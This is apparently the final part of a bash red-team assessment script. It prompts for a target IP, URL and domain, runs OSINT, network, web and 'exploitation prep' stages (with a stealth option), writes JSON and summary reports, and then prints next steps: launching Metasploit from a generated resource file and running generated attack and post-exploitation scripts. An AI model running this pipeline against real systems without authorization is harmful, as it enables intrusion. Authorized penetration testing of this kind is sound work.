        echo "    ],"
        echo "    \"subdomains\": ["
        
        # Extract subdomains
        if [ -f "$OUTDIR/osint/subdomains_subfinder.txt" ]; then
            local first_sub=true
            while read subdomain; do
                [ -n "$subdomain" ] && {
                    [ "$first_sub" = false ] && echo ","
                    echo -n "      \"$subdomain\""
                    first_sub=false
                }
            done < "$OUTDIR/osint/subdomains_subfinder.txt"
        fi
        
        echo
        echo "    ]"
        echo "  }"
        echo "}"
        
    } > "$json_file" 2>/dev/null
    
    # Check if JSON report was generated successfully
    if [ -f "$json_file" ] && [ -s "$json_file" ]; then
        echo -e "${GREEN}[REPORT]${NC} JSON report generated: ${WHITE}$json_file${NC}"
        # Validate JSON format if jq is available
        if command -v jq &> /dev/null; then
            if jq empty "$json_file" 2>/dev/null; then
                echo -e "${CYAN}[INFO]${NC} JSON format validated successfully"
            else
                echo -e "${YELLOW}[WARNING]${NC} JSON format validation failed"
            fi
        fi
    else
        echo -e "${RED}[ERROR]${NC} Failed to generate JSON report"
    fi
}

# Validate report generation
validate_reports() {
    local report_dir="$OUTDIR/reports"
    local validation_passed=true
    
    echo -e "${CYAN}[INFO]${NC} Validating report generation..."
    
    # Check executive summary
    if [ -f "$report_dir/executive_summary.txt" ] && [ -s "$report_dir/executive_summary.txt" ]; then
        local line_count=$(wc -l < "$report_dir/executive_summary.txt")
        if [ "$line_count" -gt 50 ]; then
            echo -e "${GREEN}[OK]${NC} Executive summary report: $line_count lines"
        else
            echo -e "${YELLOW}[WARNING]${NC} Executive summary seems incomplete: $line_count lines"
            validation_passed=false
        fi
    else
        echo -e "${RED}[ERROR]${NC} Executive summary report missing or empty"
        validation_passed=false
    fi
    
    # Check JSON report
    if [ -f "$report_dir/assessment_results.json" ] && [ -s "$report_dir/assessment_results.json" ]; then
        if command -v jq &> /dev/null; then
            if jq empty "$report_dir/assessment_results.json" 2>/dev/null; then
                echo -e "${GREEN}[OK]${NC} JSON report: Valid JSON format"
            else
                echo -e "${YELLOW}[WARNING]${NC} JSON report: Invalid JSON format"
                validation_passed=false
            fi
        else
            echo -e "${GREEN}[OK]${NC} JSON report: Generated (jq not available for validation)"
        fi
    else
        echo -e "${RED}[ERROR]${NC} JSON report missing or empty"
        validation_passed=false
    fi
    
    # Check scan result files
    local scan_dirs=("osint" "network" "web" "exploitation")
    for dir in "${scan_dirs[@]}"; do
        if [ -d "$OUTDIR/$dir" ]; then
            local file_count=$(find "$OUTDIR/$dir" -type f -name "*.txt" | wc -l)
            if [ "$file_count" -gt 0 ]; then
                echo -e "${GREEN}[OK]${NC} $dir directory: $file_count result files"
            else
                echo -e "${YELLOW}[WARNING]${NC} $dir directory: No result files found"
            fi
        else
            echo -e "${YELLOW}[WARNING]${NC} $dir directory: Not found"
        fi
    done
    
    if [ "$validation_passed" = true ]; then
        echo -e "${GREEN}[VALIDATION]${NC} All reports generated successfully"
        return 0
    else
        echo -e "${YELLOW}[VALIDATION]${NC} Some reports may be incomplete"
        return 1
    fi
}

main() {
    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--help)
                show_help
                exit 0
                ;;
            -v|--version)
                echo "Security Scanner v$VERSION"
                exit 0
                ;;
            -q|--quick)
                QUICK_MODE=true
                shift
                ;;
            -s|--stealth)
                STEALTH_MODE=true
                shift
                ;;
            *)
                echo "Unknown option: $1"
                show_help
                exit 1
                ;;
        esac
    done
    
    # Configure trap for interruptions
    trap 'handle_interrupt' SIGINT SIGTERM
    
    display_banner
    
    # Get target information
    echo -e "\n${YELLOW}Target Information:${NC}"
    read -rp "Target IP address: " TARGET
    [ -z "$TARGET" ] && { echo -e "${RED}[ERROR]${NC} No IP address provided"; exit 1; }
    
    read -rp "Target URL (optional): " URL
    read -rp "Domain name (optional): " DOMAIN
    
    # Extract domain from URL if not provided
    if [ -n "$URL" ] && [ -z "$DOMAIN" ]; then
        DOMAIN=$(echo "$URL" | sed -E 's|https?://([^/]+).*|\1|')
    fi
    
    show_scan_menu
    read -rp "Select option [1-4]: " SCAN_CHOICE
    
    prepare_output
    
    echo -e "\n${CYAN}[INFO]${NC} Starting security assessment..."
    echo -e "${YELLOW}[TIP]${NC} Use Ctrl+C to gracefully stop the scan"
    
    case "$SCAN_CHOICE" in
        1)
            run_osint_scans "$TARGET" "$DOMAIN"
            ;;
        2)
            run_network_scans "$TARGET"
            ;;
        3)
            if [ -z "$URL" ]; then
                echo -e "${RED}[ERROR]${NC} URL required for web testing"
                exit 1
            fi
            run_web_scans "$URL"
            ;;
        4)
            echo -e "${CYAN}[INFO]${NC} Complete Red Team assessment in progress..."
            run_osint_scans "$TARGET" "$DOMAIN"
            [ "$SCAN_INTERRUPTED" = false ] && run_network_scans "$TARGET"
            [ "$SCAN_INTERRUPTED" = false ] && [ -n "$URL" ] && run_web_scans "$URL"
            [ "$SCAN_INTERRUPTED" = false ] && run_exploitation_prep "$TARGET"
            ;;
        *)
            echo -e "${RED}[ERROR]${NC} Invalid selection"
            exit 1
            ;;
    esac
    
    # Check if scan was interrupted
    if [ "$SCAN_INTERRUPTED" = true ]; then
        exit 130
    fi
    
    # Final report generation
    generate_clean_report
    
    # Validate all reports
    validate_reports
    
    echo -e "\n${BRIGHT_GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_GREEN}║${NC}                        ${BRIGHT_WHITE}RED TEAM ASSESSMENT COMPLETED${NC}                        ${BRIGHT_GREEN}║${NC}"
    echo -e "${BRIGHT_GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo
    echo -e "${BRIGHT_WHITE}┌─────────────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BRIGHT_WHITE}│${NC}                              ${BRIGHT_CYAN}GENERATED RESULTS${NC}                              ${BRIGHT_WHITE}│${NC}"
    echo -e "${BRIGHT_WHITE}├─────────────────────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_GREEN}*${NC} ${BRIGHT_YELLOW}Main directory:${NC} ${BRIGHT_CYAN}$OUTDIR${NC}"
    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_GREEN}*${NC} ${BRIGHT_YELLOW}Executive summary:${NC} ${BRIGHT_CYAN}$OUTDIR/reports/executive_summary.txt${NC}"
    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_GREEN}*${NC} ${BRIGHT_YELLOW}JSON report:${NC} ${BRIGHT_CYAN}$OUTDIR/reports/assessment_results.json${NC}"
    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_GREEN}*${NC} ${BRIGHT_YELLOW}Attack scripts:${NC} ${BRIGHT_CYAN}$OUTDIR/exploitation/${NC}"
    echo -e "${BRIGHT_WHITE}└─────────────────────────────────────────────────────────────────────────────┘${NC}"
    echo
    echo -e "${BRIGHT_WHITE}┌─────────────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BRIGHT_WHITE}│${NC}                              ${BRIGHT_MAGENTA}NEXT ACTIONS${NC}                              ${BRIGHT_WHITE}│${NC}"
    echo -e "${BRIGHT_WHITE}├─────────────────────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_GREEN}1.${NC} ${BRIGHT_YELLOW}View report:${NC} ${WHITE}cat $OUTDIR/reports/executive_summary.txt${NC}"
    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_GREEN}2.${NC} ${BRIGHT_YELLOW}Explore results:${NC} ${WHITE}ls -la $OUTDIR/network/${NC}"
    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_GREEN}3.${NC} ${BRIGHT_YELLOW}Launch Metasploit:${NC} ${WHITE}msfconsole -r $OUTDIR/exploitation/msf_prep.txt${NC}"
    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_GREEN}4.${NC} ${BRIGHT_YELLOW}Attack scripts:${NC} ${WHITE}chmod +x $OUTDIR/exploitation/*.sh${NC}"
    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_GREEN}5.${NC} ${BRIGHT_YELLOW}Post-exploitation:${NC} ${WHITE}bash $OUTDIR/exploitation/post_exploit.sh${NC}"
    echo -e "${BRIGHT_WHITE}└─────────────────────────────────────────────────────────────────────────────┘${NC}"
    echo
    echo -e "${BRIGHT_WHITE}┌─────────────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BRIGHT_WHITE}│${NC}                              ${BRIGHT_RED}WARNING${NC}                                ${BRIGHT_WHITE}│${NC}"
    echo -e "${BRIGHT_WHITE}├─────────────────────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_RED}*${NC} ${YELLOW}Use these tools only on your own systems${NC}                        ${BRIGHT_WHITE}│${NC}"
    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_RED}*${NC} ${YELLOW}Obtain written authorization before any testing${NC}                  ${BRIGHT_WHITE}│${NC}"
    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_RED}*${NC} ${YELLOW}Respect local and international laws${NC}                            ${BRIGHT_WHITE}│${NC}"
    echo -e "${BRIGHT_WHITE}└─────────────────────────────────────────────────────────────────────────────┘${NC}"
    echo
    echo -e "${BRIGHT_CYAN}Red Team Assessment completed successfully! Complete analysis available.${NC}"
    echo
}

# Execute main function
main "$@"